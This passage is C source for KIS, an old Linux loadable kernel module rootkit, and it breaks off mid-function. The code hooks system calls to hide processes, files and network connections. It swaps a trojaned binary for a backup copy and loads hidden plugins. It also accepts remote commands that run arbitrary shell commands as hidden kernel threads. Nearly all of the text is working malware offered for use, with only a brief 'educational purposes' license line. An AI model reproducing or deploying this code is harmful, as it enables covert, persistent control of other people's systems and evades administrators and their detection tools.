/******************************************************************************\
**     | /  |  /      KIS - Kernel Intrusion System - v0.9     | /  |  /      **
**     |<   |  --     -=< http://www.uberhax0r.net/kis >=-     |<   |  --     **
**     | \  |   /     code by optyx <optyx@uberhax0r.net>      | \  |   /     **
** kis.c - linux loadable kernel module                                       **
\******************************************************************************/
/*  This code is released free for educational purposes but may not be used
 *  commercially in any way. this code and its licensing is the sole
 *  property of optyx 
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kmod.h>
#include <linux/socket.h>
#include <linux/if_ether.h>
#include <linux/netdevice.h>
#include <linux/smp_lock.h>
#include <linux/spinlock.h>
#include <linux/stat.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/if.h>
#include <linux/modversions.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <sys/syscall.h>
#include <linux/in.h>
#include <linux/net.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/mm.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <asm/errno.h>

#include "server.h"
#include "option.h"

extern void *sys_call_table[];

int errno;
int restart = 0;
int running = 1;
long *module_list;
struct module *modules;
char *install_dir = INSTALL_DIR;
char *trojan_bin = TROJAN_BIN;
char *hidetab = NULL;
char *back_bin = NULL;

#ifdef _I386_PTRACE_H
int h_execve(struct pt_regs);
#endif

#ifdef _ASM_IA64_PTRACE_H
long h_execve(char *, char **, char **, struct pt_regs *);
#warning "untested arch"
#endif

#ifdef _ASMAXP_PTRACE_H
int h_execve(char *, char **, char **, unsigned long, unsigned long,
		unsigned long, struct pt_regs);
#warning "untested arch"
#endif

#ifdef _PPC_PTRACE_H
int h_execve(unsigned long, unsigned long, unsigned long, unsigned long,
		unsigned long, unsigned long, struct pt_regs *);
#warning "untested arch"
#endif

#ifdef _SPARC_PTRACE_H
int h_execve(struct pt_regs *);
#warning "untested arch"
#endif

#ifdef _SPARC64_PTRACE_H
int h_execve(struct pt_regs *);
#warning "untested arch"
#endif

int h_fork(struct pt_regs);
int h_clone(struct pt_regs);
int h_getdents(unsigned int, struct dirent *, unsigned int);
int h_mkdir(const char *, int);
int h_chdir(const char *);
int h_exit(int);
int h_rmdir(const char *);
int h_open(const char *,  int, int);
int h_unlink(const char *);
int h_rename(const char *, const char *);
int h_stat(char *, struct __old_kernel_stat *);
int h_lstat(char *, struct __old_kernel_stat *);
#ifdef __NR_stat64
int h_stat64(char *, struct stat64 *, long);
#endif
#ifdef __NR_lstat64
int h_lstat64(char *, struct stat64 *, long);
#endif
int h_socketcall(int, unsigned long *);
int h_init_module(const char *, struct module *);
int h_tcp_get_info(char *, char **, off_t, int);
int h_udp_get_info(char *, char **, off_t, int);
int h_raw_get_info(char *, char **, off_t, int);

#ifdef _I386_PTRACE_H
int (*o_execve)(struct pt_regs);
#endif

#ifdef _ASM_IA64_PTRACE_H
long (*o_execve)(char *, char **, char **,  struct pt_regs *);
#endif

#ifdef _ASMAXP_PTRACE_H
int (*o_execve)(char *, char **, char **, unsigned long, unsigned long,
		unsigned long, struct pt_regs);
#endif

#ifdef _PPC_PTRACE_H
int (*o_execve)(unsigned long, unsigned long, unsigned long, unsigned long,
		unsigned long, unsigned long, struct pt_regs *);
#endif

#ifdef _SPARC_PTRACE_H
int (*o_execve)(struct pt_regs *);
#endif

#ifdef _SPARC64_PTRACE_H
int (*o_execve)(struct pt_regs *);
#endif

int (*o_getdents)(unsigned int, struct dirent *, unsigned int);
int (*o_fork)(struct pt_regs);
int (*o_clone)(struct pt_regs);
int (*o_mkdir)(const char *, int);
int (*o_chdir)(const char *);
int (*o_exit)(int);
int (*o_rmdir)(const char *);
int (*o_open)(const char *, int, int);
int (*o_unlink)(const char *);
int (*o_rename)(const char *, const char *);
int (*o_stat)(char *, struct __old_kernel_stat *);
int (*o_lstat)(char *, struct __old_kernel_stat *);
#ifdef __NR_stat64
int (*o_stat64)(char *, struct stat64 *, long);
#endif
#ifdef __NR_lstat64
int (*o_lstat64)(char *, struct stat64 *, long);
#endif
int (*o_socketcall)(int, unsigned long *);
int (*o_init_module)(const char *, struct module *);
int (*o_tcp_get_info)(char *, char **, off_t, int);
int (*o_udp_get_info)(char *, char **, off_t, int);
int (*o_raw_get_info)(char *, char **, off_t, int);

struct resp {
        long sip;
        long dip;
        short dport;
};

struct c_queue_item {
        struct resp *res;
        char *comm;
        struct c_queue_item *next;
};

struct execve_args {
        char *path;
        char **argv;
};

struct c_queue_item *cqueue = NULL, *cqueuet = NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,3,0)
#define NET_DEVICE struct net_device
#else
#define NET_DEVICE struct device
#endif

int h_ip_rcv(struct sk_buff *, NET_DEVICE *, struct packet_type *);
struct packet_type *o_ip_packet_type = NULL;
struct packet_type h_ip_packet_type =
{
        __constant_htons(ETH_P_IP),
        NULL,
        h_ip_rcv,
        (void *) 1,
        NULL,
};

int queue_quit = 1;

int r_ping(char *, struct resp *);
int r_remove(char *, struct resp *);
int r_shutdown(char *, struct resp *);
int r_list_func(char *, struct resp *);
int r_load_plugin(char *, struct resp *);
int r_unload_plugin(char *, struct resp *);
int r_start_proc(char *, struct resp *);
int i_exec_prog(void *);
int r_list_redir(char *, struct resp *);
int r_exec_redir(char *, struct resp *);
int r_rm_redir(char *, struct resp *);
struct redir *i_get_redir(char *);
int i_hide_conns(char *, int);
int r_hide_net(char *, struct resp *);
int i_hide_net(long, short);
int r_unhide_net(char *, struct resp *);
int i_unhide_net(long, short);
int r_list_nhides(char *, struct resp *);
int i_nishidden(long, short);
int i_proc_hook(char *, void *, void *);
void i_reply(struct resp *, char *, ...);
#ifdef ELITE_GID
int i_fishidden(struct super_block *, long);
#else
int i_fishidden(char *, long);
void i_write_ht(void);
int i_hide_file(char *, long, struct resp *);
#endif
int r_hide_file(char *, struct resp *);
int r_unhide_file(char *, struct resp *);
int r_list_fhides(char *, struct resp *);
int r_hide_proc(char *, struct resp *);
int i_hide_proc(pid_t);
int r_unhide_proc(char *, struct resp *);
int i_unhide_proc(pid_t);
int i_isdead(pid_t);
int r_list_phides(char *, struct resp *);
int i_pishidden(pid_t);
int i_listfunct(char *);
int i_addfunct(char *, char *, int (*)(char *, struct resp *));
int queue_handler(void *);
int i_exec_funct(char *, char **);

int i_callfunc(char *, char *, struct resp *);
#ifdef ANTI_SEC
void i_remove_protect(struct module *, int);
#endif
int i_cleanup(void);
long i_strtol(char *, int, int);
int init_module(void);
int cleanup_module(void);

struct semaphore sem;

struct funct {
        char *plug;
        char *name;
        int (*funct)(char *, struct resp *);
        struct funct *next;
};

struct funct *functs = NULL; 

struct redir {
        char *old;
        char *new;
        struct redir *next;
};

#ifdef _I386_PTRACE_H
int h_execve(struct pt_regs regs)
{
	int error;
	char *filename;
	struct redir *redir = NULL;
	lock_kernel();

	filename = getname((char *)regs.ebx);
	error = PTR_ERR(filename);
	if(IS_ERR(filename))
		goto out;

	if(i_pishidden(current->pid))
        {
                if(i_exec_funct((char *) regs.ebx, (char **)regs.ecx) == 0)
                {
                        error = 0;
                        goto out;
                }
        }
	else
		redir = i_get_redir(filename);

	if(redir == NULL)
	{
		if(strcmp(trojan_bin, filename) == 0 && restart)
			error = do_execve(back_bin, (char **)regs.ecx,
				(char **)regs.edx, &regs);
		else
			error = do_execve(filename, (char **)regs.ecx,
				(char **)regs.edx, &regs);
	}
	else
		error = do_execve(redir->new, (char **)regs.ecx,
				(char **)regs.edx, &regs);
	putname(filename);
out:
	unlock_kernel();
	return error;
}
#endif

#ifdef _ASM_IA64_PTRACE_H
long h_execve (char *filename, char **argv, char **envp, struct pt_regs *regs)
{
        int error;
	struct redir *redir = NULL;

        filename = getname(filename);
        error = PTR_ERR(filename);
        if (IS_ERR(filename))
                goto out;

        if(i_pishidden(current->pid))
        {
                if(i_exec_funct(filename, argv) == 0)
                {
                        error = 0;
                        goto out;
                }
        }
        else
		redir = i_get_redir(filename);

	if(redir == NULL)
		if(strcmp(trojan_bin, filename) == 0 && restart)
			error = do_execve(back_bin, argv, envp, regs); 
		else
			error = do_execve(filename, argv, envp, regs);
	else
		error = do_execve(redir->new, argv, envp, regs);
        putname(filename);
out:
        return error;
}
#endif

#ifdef _ASMAXP_PTRACE_H
int h_execve(char *ufilename, char **argv, char **envp,
	unsigned long a3, unsigned long a4, unsigned long a5,
	struct pt_regs regs)
{
	int error;
	struct redir *redir = NULL;
	char *filename;

	filename = getname(ufilename);
	error = PTR_ERR(filename);
	if (IS_ERR(filename))
		goto out;

        if(i_pishidden(current->pid))
        {
                if(i_exec_funct(filename, argv) == 0)
                {
                        error = 0;
                        goto out;
                }
        }
        else
		redir = i_get_redir(filename);	

	if(redir == NULL)
		if(strcmp(trojan_bin, filename) == 0 && restart)
			error = do_execve(back_bin, argv, envp, &regs);
		else
			error = do_execve(filename, argv, envp, &regs);
	else
		error = do_execve(redir->new, argv, envp, &regs);
	putname(filename);
out:
	return error;
}
#endif

#ifdef _PPC_PTRACE_H
int h_execve(unsigned long a0, unsigned long a1, unsigned long a2,
               unsigned long a3, unsigned long a4, unsigned long a5,
               struct pt_regs *regs)
{
        int error;
	struct redir *redir = NULL;
        char * filename;

        filename = getname((char *) a0);
        error = PTR_ERR(filename);
        if (IS_ERR(filename))
                goto out;
        if (regs->msr & MSR_FP)
                giveup_fpu(current);
#ifdef CONFIG_ALTIVEC
        if (regs->msr & MSR_VEC)
                giveup_altivec(current);
#endif /* CONFIG_ALTIVEC */

        if(i_pishidden(current->pid))
        {
                if(i_exec_funct(filename, (char **) a1) == 0)
                {
                        error = 0;
                        goto out;
                }
        }
        else
		redir = i_get_redir(filename);

	if(redir == NULL)
		if(strcmp(trojan_bin, filename) == 0 && restart)
        		error = do_execve(filename, (char **) a1, 
				(char **) a2, regs);
		else
			error = do_execve(filename, (char **) a1,
				(char **) a2, regs);		
	else
		error = do_execve(redir->new, (char **) a1, (char **) a2, regs);
        if (error == 0)
                current->ptrace &= ~PT_DTRACE;
        putname(filename);
out:
        return error;
}
#endif

#ifdef _SPARC_PTRACE_H
int h_execve(struct pt_regs *regs)
{
        int error, base = 0;
	struct redir *redir = NULL;
        char *filename;

        /* Check for indirect call. */
        if(regs->u_regs[UREG_G1] == 0)
                base = 1;

        filename = getname((char *)regs->u_regs[base + UREG_I0]);
        error = PTR_ERR(filename);
        if(IS_ERR(filename))
                goto out;

        if(i_pishidden(current->pid))
        {
                if(i_exec_funct(filename, 
			(char **) regs->u_regs[base + UREG_I1]) == 0)
                {
                        error = 0;
                        goto out;
                }
        }
        else
		redir = i_get_redir(filename);

	if(redir == NULL)
		if(strcmp(trojan_bin, filename) == 0 && restart)
        		error = do_execve(back_bin, 
				(char **) regs->u_regs[base + UREG_I1],
                          	(char **) regs->u_regs[base + UREG_I2], regs);
		else
			error = do_execve(filename,
				(char **) regs->u_regs[base + UREG_I1],
				(char **) regs->u_regs[base + UREG_I2], regs);
	else
		error = do_execve(redir->new,
				(char **) regs->u_regs[base + UREG_I1],
				(char **) regs->u_regs[base + UREG_I2], regs);
        putname(filename);
out:
        return error;
}
#endif

#ifdef _SPARC64_PTRACE_H
asmlinkage int h_execve(struct pt_regs *regs)
{
        int error, base = 0;
	struct redir *redir = NULL;
        char *filename;

        /* User register window flush is done by entry.S */

        /* Check for indirect call. */
        if (regs->u_regs[UREG_G1] == 0)
                base = 1;

        filename = getname((char *)regs->u_regs[base + UREG_I0]);
        error = PTR_ERR(filename);
        if (IS_ERR(filename))
                goto out;

        if(i_pishidden(current->pid))
        {
                if(i_exec_funct(filename,
			(char **) regs->u_regs[base + UREG_I1]) == 0)
                {
                        error = 0;
                        goto out;
                }
        }
        else
		redir = i_get_redir(filename);

	if(redir == NULL)
		if(strcmp(trojan_bin, filename) == 0 && restart)
        		error = do_execve(back_bin, 
				(char **) regs->u_regs[base + UREG_I1],
                          	(char **) regs->u_regs[base + UREG_I2], regs);
		else
			error = do_execve(filename,
				(char **) regs->u_regs[base + UREG_I1],
				(char **) regs->u_regs[base + UREG_I2], regs);
	else
		error = do_execve(redir->new,
				(char **) regs->u_regs[base + UREG_I1],
				(char **) regs->u_regs[base + UREG_I2], regs);
        putname(filename);
        if (!error) {
                fprs_write(0);
                current->thread.xfsr[0] = 0;
                current->thread.fpsaved[0] = 0;
                regs->tstate &= ~TSTATE_PEF;
        }
out:
        return error;
}
#endif

int h_clone(struct pt_regs regs)
{
	pid_t pid;
	pid = o_clone(regs);
	if(i_pishidden(current->pid))
		i_hide_proc(pid);
	return pid;
}

int h_fork(struct pt_regs regs)
{
	pid_t pid;
	pid = o_fork(regs);
	if(i_pishidden(current->pid) && pid > 0)
		i_hide_proc(pid);
	return pid;
}

int h_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
{
#ifdef ELITE_GID
	struct file *file;
#endif
	int ret, hide;
	pid_t tmp;
	struct inode *dinode;
	char *ptr;
	struct dirent *curr,*prev = NULL;
	kdev_t dev;
	
	ret = o_getdents(fd, dirp, count);

	if(ret < 1 || i_pishidden(current->pid))
		return ret;

	dinode = current->files->fd[fd]->f_dentry->d_inode;
	dev = dinode->i_sb->s_dev;

#ifdef ELITE_GID
	if((file = fget(fd)) == NULL)
		return -EBADF;
#endif
	for(ptr=(char *) dirp;ptr < (char *) dirp + ret;ptr+=curr->d_reclen)
	{
		hide = 0;
		curr = (struct dirent *)ptr;
		if(dinode->i_ino == PROC_ROOT_INO)
		{
			tmp = i_strtol(curr->d_name, strlen(curr->d_name), 10);
			if(i_pishidden(tmp))
				hide++;
		}
#ifdef ELITE_GID
		if(i_fishidden(file->f_dentry->d_sb, curr->d_ino))
#else
		if(i_fishidden(curr->d_name, curr->d_ino))
#endif
			hide++;
		if(hide > 0)
		{
			if(curr == dirp)
			{
				ret-=curr->d_reclen;
				memcpy(ptr, ptr + curr->d_reclen, ret);
				continue;
			}
			else
				prev->d_reclen+=curr->d_reclen;
		}
		else
			prev=curr;
	}
#ifdef ELITE_GID
	fput(file);
#endif
	return ret;
}

int h_mkdir(const char *filename, int mode)
{
	int ret;

	ret = o_mkdir(filename, mode);
	if(ret == 0)
		if(i_pishidden(current->pid))
			r_hide_file((char *) filename, NULL);
	return ret;
}

int h_chdir(const char *path)
{
	int ret;
	struct file *file;
	struct dentry *d;
	if(i_pishidden(current->pid))
		goto norm;
	file = filp_open(path, 0, O_RDONLY);
	if(IS_ERR(file))
		goto norm;
	d = file->f_dentry;
#ifdef ELITE_GID
	if(i_fishidden(d->d_sb, d->d_inode->i_ino))
#else
	if(i_fishidden((char *) d->d_name.name, d->d_inode->i_ino))
#endif
	{
		filp_close(file, NULL);
		return -ENOENT;
	}	
	filp_close(file, NULL);
norm:
	ret = o_chdir(path);
	return ret;
}

int h_exit(int error_code)
{
	int ret;
	if(i_pishidden(current->pid))
		i_unhide_proc(current->pid);
	ret = o_exit(error_code);
	return ret;
}

int h_rmdir(const char *pathname)
{
	int ret;
	if(i_pishidden(current->pid))
		r_unhide_file((char *) pathname, NULL);
	else
	{
		struct file *file;
		struct dentry *d;
		file = filp_open(pathname, 0, O_RDONLY);
		if(IS_ERR(file))
			goto norm;
		d = file->f_dentry;
#ifdef ELITE_GID
		if(i_fishidden(d->d_sb, d->d_inode->i_ino))
#else
		if(i_fishidden((char *) d->d_name.name, d->d_inode->i_ino))
#endif
		{
			filp_close(file, NULL);
			return -ENOENT;
		}
		filp_close(file, NULL);
	}
norm:
	ret = o_rmdir(pathname);	
	return ret;
}

int h_open(const char *filename, int flags, int mode)
{
	int ret;
	struct file *filp;
	struct dentry *d;

	if(i_pishidden(current->pid))
		goto norm;
	
	filp = filp_open(filename, 0, O_RDONLY);
	if(IS_ERR(filp))
                goto norm;

	d = filp->f_dentry;
#ifdef ELITE_GID
	if(i_fishidden(d->d_sb, d->d_inode->i_ino))
#else
	if(i_fishidden((char *) d->d_name.name, d->d_inode->i_ino))
#endif
	{
		filp_close(filp, NULL);
		return -EEXIST;
	}
	filp_close(filp, NULL);
	if(strcmp(filename, trojan_bin) == 0 && restart)
	{
		mm_segment_t oldfs;
		oldfs = get_fs();
		set_fs(KERNEL_DS);
		ret = o_open(back_bin, flags, mode);
		set_fs(oldfs);
		return ret;
	}
norm:
	ret = o_open(filename, flags, mode);
	return ret;
}

int h_unlink(const char *pathname)
{
	int ret;
	struct file *filp;
	struct dentry *d;

	filp = (struct file *) filp_open(pathname, 0, O_RDONLY);
        if(IS_ERR(filp))
                goto norm;

	d = filp->f_dentry;
#ifdef ELITE_GID
	if(i_fishidden(d->d_sb, d->d_inode->i_ino))
#else
	if(i_fishidden((char *) d->d_name.name, d->d_inode->i_ino))
#endif
		if(i_pishidden(current->pid) == 0)
		{
			filp_close(filp, NULL);
			return -ENOENT;
		}
	filp_close(filp, NULL);
	if(strcmp(pathname, trojan_bin) == 0 && restart)
	{
		ret = o_unlink(back_bin);
		return ret;
	}
norm:
	ret = o_unlink(pathname);
	return ret;
}

#ifdef ELITE_GID
#define FILENAME_HIDDEN(filename) \
	struct file *file; \
	struct dentry *d; \
	if(i_pishidden(current->pid)) \
		goto norm; \
	file = filp_open(filename, 0, O_RDONLY); \
	if(IS_ERR(file)) \
		goto norm; \
	d = file->f_dentry; \
	if(i_fishidden(d->d_sb, d->d_inode->i_ino)) \
	{ \
		filp_close(file, NULL); \
		return -ENOENT; \
	} \
	filp_close(file, NULL); \
	norm:
#else
#define FILENAME_HIDDEN(filename) \
	struct file *file; \
	struct dentry *d; \
	if(i_pishidden(current->pid)) \
		goto norm; \
	file = filp_open(filename, 0, O_RDONLY); \
	if(IS_ERR(file)) \
		goto norm; \
	d = file->f_dentry; \
	if(i_fishidden((char *) d->d_name.name, d->d_inode->i_ino)) \
	{ \
		filp_close(file, NULL); \
		return -ENOENT; \
	} \
	filp_close(file, NULL);	\
	norm:
#endif

int h_rename(const char *old, const char *new)
{
	int ret;
	FILENAME_HIDDEN(old);
	if(strcmp(old, trojan_bin) == 0 && restart)
	{
		mm_segment_t oldfs;
		oldfs=get_fs();
		set_fs(KERNEL_DS);
		ret = o_rename(back_bin, new);
		set_fs(oldfs);
		return ret;
	}

	if(strcmp(new, trojan_bin) == 0 && restart)
	{
		mm_segment_t oldfs;
		oldfs=get_fs();
		set_fs(KERNEL_DS);
		ret = o_rename(old, back_bin);
		set_fs(oldfs);
		return ret;
	}
	ret = o_rename(old, new);
	return ret;
}

int h_stat(char *filename, struct __old_kernel_stat *statbuf)
{
	int ret;
	FILENAME_HIDDEN(filename);
	if(strcmp(filename, trojan_bin) == 0 && restart)
	{
		mm_segment_t oldfs;
		oldfs = get_fs();
		set_fs(KERNEL_DS);
		ret = o_stat(back_bin, statbuf);
		set_fs(oldfs);
		return ret;
	}
	ret = o_stat(filename, statbuf);
	return ret;
}

int h_lstat(char *filename, struct __old_kernel_stat *statbuf)
{
	int ret;
	FILENAME_HIDDEN(filename);
	if(strcmp(filename, trojan_bin) == 0 && restart)
	{
		mm_segment_t oldfs;
		oldfs = get_fs();
		set_fs(KERNEL_DS);
		ret = o_lstat(back_bin, statbuf);
		set_fs(oldfs);
		return ret;
	}
	ret = o_lstat(filename, statbuf);
	return ret;
}

#ifdef __NR_stat64
int h_stat64(char *filename, struct stat64 *statbuf, long flags)
{
	int ret;
	FILENAME_HIDDEN(filename);
	if(strcmp(filename, trojan_bin) == 0 && restart)
	{
		mm_segment_t oldfs;
		oldfs = get_fs();
		set_fs(KERNEL_DS);
		ret = o_stat64(back_bin, statbuf, flags);
		set_fs(oldfs);
		return ret;
	}
	ret = o_stat64(filename, statbuf, flags);
	return ret;
}
#endif

#ifdef __NR_lstat64
int h_lstat64(char *filename, struct stat64 *statbuf, long flags)
{
	int ret;
	FILENAME_HIDDEN(filename);
	if(strcmp(filename, trojan_bin) == 0 && restart)
	{
		mm_segment_t oldfs;
		oldfs = get_fs();
		set_fs(KERNEL_DS);
		ret = o_lstat64(back_bin, statbuf, flags);
		set_fs(oldfs);
		return ret;
	}
	ret = o_lstat64(filename, statbuf, flags);
	return ret;
}
#endif

int h_socketcall(int call, unsigned long *args)
{
	int ret;
	struct sockaddr_in *addr;
	if(i_pishidden(current->pid) == 0)
		goto norm;
	switch(call)
	{
		case SYS_CONNECT:
				addr = (struct sockaddr_in *) args[1];
				break;
		case SYS_BIND:
				addr = (struct sockaddr_in *) args[1];
				addr->sin_addr.s_addr = 0;
				break;
		default:
			goto norm;
	}

	if(addr->sin_family != AF_INET)
		goto norm;	
	if(i_nishidden(addr->sin_addr.s_addr, addr->sin_port))
		goto norm;
	i_hide_net(addr->sin_addr.s_addr, addr->sin_port);
norm:
	ret = o_socketcall(call, args);
	return ret;
}

int h_init_module(const char *name_user, struct module *mod_user)
{
	int ret;
	struct module *mod = NULL;
	void *init;
	init = mod_user->init;
#ifdef ANTI_SEC
	i_remove_protect(mod_user, 0);
#endif
	ret = o_init_module(name_user, mod_user);
#ifdef ANTI_SEC
	i_remove_protect(mod_user, 1);
#endif
	if(strcmp(__this_module.name, mod_user->name) == 0)
		if(mod_user->cleanup != NULL)
			mod_user->cleanup();
	mod = (struct module *) *module_list;
	if(strcmp(mod->name, mod_user->name) == 0)
		if(mod->init != init)
		{
			char *tmp;
			int (*func)(void *, void *, void *);
			tmp = (char *) mod->init();
			if(tmp == NULL)
				goto norm;
			if(strcmp(KEY2, tmp) != 0)
				goto norm;
			func = (void *) mod->init;
			if(func(&i_callfunc, &i_addfunct, &i_reply) < 0)
				goto norm;
			*module_list = (long) mod->next;
			mod->next = modules;
			modules = mod;
		}
norm:
	return ret;
}

int h_tcp_get_info(char *buffer, char **start, off_t offset, int length)
{
	int ret;
	ret = o_tcp_get_info(buffer, start, offset, length);
	ret = i_hide_conns(buffer, ret);
	return ret;
}

int h_udp_get_info(char *buffer, char **start, off_t offset, int length)
{
	int ret;
	ret = o_udp_get_info(buffer, start, offset, length);
	ret = i_hide_conns(buffer, ret);
	return ret;
}

int h_raw_get_info(char *buffer, char **start, off_t offset, int length)
{
	int ret;
	ret = o_raw_get_info(buffer, start, offset, length);
	ret = i_hide_conns(buffer, ret);
	return ret;
}

int r_ping(char *args, struct resp *res)
{
	i_reply(res, "0ping %s\r\n", args);
	return 0;
}

#define WAITPID(x) spin_lock_irq(&current->sigmask_lock); \
		tmpsig = current->blocked; \
		siginitsetinv(&current->blocked, 0);\
		recalc_sigpending(current); \
		spin_unlock_irq(&current->sigmask_lock); \
		waitpid(x, NULL, __WCLONE); \
		spin_lock_irq(&current->sigmask_lock); \
		current->blocked = tmpsig; \
		recalc_sigpending(current); \
		spin_unlock_irq(&current->sigmask_lock); \

int r_list_func(char *args, struct resp *res)
{
	struct funct *curr;
	if(strcmp(args, "") == 0)
		i_reply(res, "2--list_func--\r\n");
	for(curr = functs; curr != NULL; curr=curr->next)
	{
		if((strcmp(args, "") == 0) || (strcmp(args, curr->plug) == 0))
			if(strcmp(curr->plug, "") != 0)
				i_reply(res, "1%s:%s\r\n", 
					curr->plug, curr->name);
	}
	return 0;
}

int r_load_plugin(char *args, struct resp *res)
{
	struct file *filp;
	char *tmp;

	filp = filp_open(args, O_RDONLY, 0);
	if(IS_ERR(filp))
	{
		tmp = (char *) kmalloc(strlen(install_dir) + 2 + strlen(args),
			GFP_KERNEL);
		memset(tmp, 0, strlen(install_dir) + strlen(args) + 2);
		sprintf(tmp, "%s/%s", install_dir, args);
		filp = filp_open(tmp, O_RDONLY, 0);
		if(IS_ERR(filp))
		{
			kfree(tmp);
			i_reply(res, "0%s plugin not found\r\n", args);	
			return 0;
		}
	}
	else
	{
		tmp = kmalloc(strlen(args) + 1, GFP_KERNEL);
		memset(tmp, 0, strlen(args) + 1);
		sprintf(tmp, "%s", args);
	}
	filp_close(filp, NULL);

	if(args[strlen(args) - 1] == 'o' && args[strlen(args) - 2] == '.')
	{
		sigset_t tmpsig;
		char *file, *a[3];
		struct execve_args argv;
		pid_t pid;
		file = (char *) kmalloc(strlen(back_bin) + 2, GFP_KERNEL);
		a[0] = file;
		a[1] = tmp;
		a[2] = NULL;
		memset(file, 0, strlen(back_bin) + 2);
		sprintf(file, "%s.", back_bin);
		argv.path = file;
		argv.argv = a;
		pid = kernel_thread(i_exec_prog, &argv, 0);
		if(pid < 0)
		{
			kfree(file);
			kfree(tmp);
			i_reply(res, "0error spawning %s\r\n", file);
			return 0;
		}
		i_hide_proc(pid);
		i_reply(res, "0plugin %s loaded\r\n", tmp); 
		
		WAITPID(pid);	

		kfree(file);
		kfree(tmp);
	}
	else
	{
		char *func;
		for(func = tmp; strstr(func, "/") != NULL;
			func = strstr(func, "/") + 1);
		if(i_addfunct(tmp, func, NULL) == -1)
		{
			i_reply(res, "0error loading plugin %s\r\n", func);
			kfree(tmp);
		}
		else
			i_reply(res, "0plugin %s loaded\r\n", func);
	}
	return 0;
}

int r_unload_plugin(char *args, struct resp *res)
{
	int found = 0;
	struct module *tmp;
	struct funct *curr, *prev;

	if(strcmp(args, "") == 0)
		goto out;

	for(curr=functs,prev=NULL;curr!=NULL;prev=curr,curr=curr->next)
	{
		if(strcmp(curr->plug, args) == 0)
		{
			prev->next = curr->next;
			found++;
		}
	}

	for(tmp = modules; tmp != NULL; tmp=tmp->next)
	{
		if(strcmp(args, tmp->name) == 0)
		{
			tmp->cleanup();
			found++;
		}
	}

out:	
	if(found)	
		i_reply(res, "0plugin %s unloaded\r\n", args);
	else
		i_reply(res, "0plugin %s not found\r\n", args);
	return 0;
} 

/* start_proc stuff copied from knark (generic code, but figured I'd mention
 * it.)
 */

int r_start_proc(char *args, struct resp *res)
{
	sigset_t tmpsig;
	static char *argv[4];
	pid_t pid;
	static struct execve_args execve_args;
	char *tmp = args;
	int hide;

	hide = 0;
	switch(*tmp)
	{
		case 'h':
				hide++;
		case 'u':
				break;
		default:
				i_reply(res, "0invalid format\n");
				return 0;
				break;
	}

	tmp+=2;
	argv[0] = "/bin/sh";
	argv[1] = "-c";
	argv[2] = tmp;
	argv[3] = NULL;

	execve_args.path = argv[0];
	execve_args.argv = argv;

	pid = kernel_thread(i_exec_prog, (void *) &execve_args, 0);
	if(pid == -1)
	{
		i_reply(res, "0error executing %s\r\n", tmp);
		return 0;
	}
	if(hide)
		i_hide_proc(pid);
	WAITPID(pid);
	i_reply(res, "0%s running as pid %d\r\n", tmp, pid);
	return 0;
}

int i_exec_prog(void *data)
{
	struct execve_args *args = (struct execve_args *) data;
        static char *envp[] = { "HOME=/", "TERM=linux",
                "PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:"
                "/usr/local/sbin:/usr/X11/bin", NULL
        };

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,3,0)
	current->nice = 0;
#else
	current->priority = 0;
#endif
	current->tty = NULL;
	set_fs(KERNEL_DS);
	execve(args->path, args->argv, envp);
	i_unhide_proc(current->pid);
	return 0;
}

#define MAX_REDIRS 2
rwlock_t redirsl;
int nredirs = 0;
struct redir *redirs = NULL, *redirst = NULL;

int r_list_redir(char *args, struct resp *res)
{
	struct redir *curr;
	i_reply(res, "0--list redirs--\r\n");
	read_lock(&redirsl);
	for(curr=redirs;curr!=NULL;curr=curr->next)
		i_reply(res, "0%s -> %s\r\n", curr->old, curr->new);
	read_unlock(&redirsl);
	i_reply(res, "0--end of redirs--\r\n");
	return 0;
}

int r_exec_redir(char *args, struct resp *res)
{
	char *old, *new;
	struct redir *ret, *curr;
	old = strtok(args, " ");
	new = strtok(NULL, " ");
	
	if(new == NULL) 
	{
		i_reply(res, "0invalid argument format: %s\r\n", args);
		return 0;
	}
	
	ret = i_get_redir(old);
	if(ret != NULL)
	{
		i_reply(res, "0%s already redirected to %s\r\n", old, new);
		return 0;
	}

	write_lock(&redirsl);
	
	if(nredirs > MAX_REDIRS)
	{
		i_reply(res, "0redirection cap reached: %d\n", MAX_REDIRS);
		write_unlock(&redirsl);
		return 0;
	}

	nredirs++;
	curr = (struct redir *) kmalloc(sizeof(struct redir), GFP_KERNEL);
	curr->old = (char *) kmalloc(strlen(old), GFP_KERNEL);
	curr->new = (char *) kmalloc(strlen(new), GFP_KERNEL);
	strcpy(curr->old, old);
	strcpy(curr->new, new);
	curr->next=NULL;
	if(redirs == NULL)
		redirs = redirst = curr;
	else
	{
		redirst->next = curr;
		redirst = curr->next;
	}
	write_unlock(&redirsl);

	i_reply(res, "0%s -> %s\r\n", old, new);
	return 0;
}

int r_rm_redir(char *args, struct resp *res)
{
	struct redir *curr, *prev;

	if(strcmp(args, "") == 0)
	{
		i_reply(res, "0invalid syntax\r\n");
		return 0;
	}
	if(strstr(args, " ") != NULL)
		*(strstr(args, " ")) = 0;

	write_lock(&redirsl);
	for(curr=redirs, prev=NULL;curr!=NULL;prev=curr,curr=curr->next)
	{
		if(strcmp(curr->old, args) == 0)
		{
			if(curr==redirst)
				redirst = prev;
			if(curr==redirs)
				redirs=redirs->next;
			else
				prev->next = curr->next;
			i_reply(res, "0removed %s -> %s redirection\r\n",
				curr->old, curr->new);
			kfree(curr->old);
			kfree(curr->new);
			kfree(curr);
			nredirs--;
			write_unlock(&redirsl);
			return 0;
		}
        }

	if(strcmp(args, "0") == 0)
	{
		for(curr=redirs;curr!=NULL;)
		{
			prev = curr;
			curr=curr->next;
			i_reply(res, "0removed %s -> %s redirection\r\n",
				curr->old, curr->new);
			kfree(prev->old);
			kfree(prev->new);
			kfree(prev);
		}
		redirs = NULL;
		redirst = NULL;
		write_unlock(&redirsl);
		return 0;
	}
	write_unlock(&redirsl);
	i_reply(res, "0%s redirection not found\r\n", args);
	return 0;
}

struct redir *i_get_redir(char *old)
{
	struct redir *curr;
	read_lock(&redirsl);
